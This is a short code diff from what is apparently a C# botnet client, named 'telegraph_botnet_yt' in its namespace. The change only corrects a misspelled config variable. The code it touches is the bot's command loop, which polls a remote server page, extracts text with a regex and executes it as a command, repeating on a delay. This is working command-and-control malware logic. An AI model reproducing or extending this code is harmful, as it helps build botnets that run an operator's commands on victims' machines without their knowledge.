@@ -20,14 +20,14 @@ namespase telegraph_botnet_yt
 			while(true)
 			{
 
-				string html = web.GetHTML(cofigs.server);
+				string html = web.GetHTML(configs.server);
 
 				Match regx = Regex.Match(html, "<p>(.*)</p><article");
 				string content = regx.Groups[1].Value;
 
 				if(last_cmd == content) 
 				{
-					 Thread.Sleep(cofigs.delay);
+					 Thread.Sleep(configs.delay);
 					 continue;
 				}
 				last_cmd = content;
@@ -35,7 +35,7 @@ namespase telegraph_botnet_yt
 				cmd command = new cmd(content);
 				Execute(command);
 
-				Thread.Sleep(cofigs.delay);
+				Thread.Sleep(configs.delay);
 			}
 
 		}
